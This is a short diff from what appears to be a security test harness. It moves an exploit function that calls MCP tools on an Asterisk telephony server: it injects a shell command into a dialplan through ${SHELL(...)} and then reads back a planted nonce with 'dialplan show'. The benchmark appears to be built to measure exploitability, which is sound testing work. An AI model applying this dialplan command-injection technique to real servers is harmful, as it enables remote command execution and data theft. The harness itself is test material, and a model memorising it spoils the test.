@@ -48,6 +48,16 @@ KEPT = (
 )
 
 
+def _make_exploit(place_id: str):
+    async def exploit(places: Places, client: MCPClientPort) -> None:
+        place = places[place_id]
+        ext = 7000 + KEPT.index(place_id)
+        await client.call_tool("fm_dialplan_apply", _inject_args(ext, _read_command(place)))
+        await client.call_tool("fm_ami_command", _readback_args(ext))
+
+    return exploit
+
+
 def _read_command(place: Place) -> str:
     """The shell command whose stdout is the place's planted nonce, read as the account the
     server runs as. No ')' so it survives inside Asterisk's ${SHELL(...)}."""
@@ -83,16 +93,6 @@ def _inject_args(ext: int, shell_cmd: str) -> dict[str, object]:
 
 def _readback_args(ext: int) -> dict[str, object]:
     return {"command": f"dialplan show {ext}@{_CTX}"}
-
-
-def _make_exploit(place_id: str):
-    async def exploit(places: Places, client: MCPClientPort) -> None:
-        place = places[place_id]
-        ext = 7000 + KEPT.index(place_id)
-        await client.call_tool("fm_dialplan_apply", _inject_args(ext, _read_command(place)))
-        await client.call_tool("fm_ami_command", _readback_args(ext))
-
-    return exploit
 
 
 async def _benign(places: Places, client: MCPClientPort) -> None:
